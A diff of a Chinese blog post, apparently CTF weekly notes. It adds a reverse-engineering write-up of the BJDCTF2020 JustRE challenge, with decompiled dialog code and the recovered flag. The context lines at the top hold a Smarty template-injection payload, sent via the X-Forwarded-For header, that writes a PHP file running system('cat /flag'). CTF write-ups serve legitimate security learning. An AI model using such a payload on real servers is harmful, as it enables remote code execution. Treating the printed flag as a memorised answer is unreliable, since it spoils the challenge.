@@ -699,6 +699,41 @@ var
 <p>读到存在flag目录,直接 cat &#x2F;flag  </p>
 <p>XFF payload: <code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+eval(system(&#39;cat /flag&#39;));&quot;,$s)&#125;</code>  </p>
 <p>得到flag  </p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>IDA打开  </p>
+<p>main函数中似乎没有什么有用的东西  </p>
+<p>点击菜单栏的“View”（视图）&gt;“Open subviews”（打开子视图）&gt;“Strings”（字符串）打开字符串窗口  </p>
+<p>发现<code>BJD&#123;%d%d2069a45792d233ac&#125;</code>,跟进看看</p>
+<pre><code>INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)
+&#123;
+CHAR String[100]; // [esp+0h] [ebp-64h] BYREF
+
+if ( a2 != 272 )
+&#123;
+    if ( a2 != 273 )
+    return 0;
+    if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 )
+    &#123;
+    sprintf(String, Format, ++dword_4099F0);
+    if ( dword_4099F0 == 19999 )
+    &#123;
+        sprintf(String, &quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;, 19999, 0);
+        SetWindowTextA(hWnd, String);
+        return 0;
+    &#125;
+    SetWindowTextA(hWnd, String);
+    return 0;
+    &#125;
+    EndDialog(hWnd, (unsigned __int16)a3);
+&#125;
+return 1;
+&#125;  
+</code></pre>
+<p>这里判断是否点击次数是19999次，Format 点进去是‘您已经点了 %d 次’，说明dword_4099F0存的是点击次数。然后判断是否点击19999次，输出BJD{1999902069a45792d233ac}</p>
+<p>说明flag是BJD{1999902069a45792d233ac} </p>
+<p>参考：</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/Tree-24/p/17311980.html">[BJDCTF2020]JustRE</a></p>
+</blockquote>
 ]]></content>
       <tags>
         <tag>周报</tag>
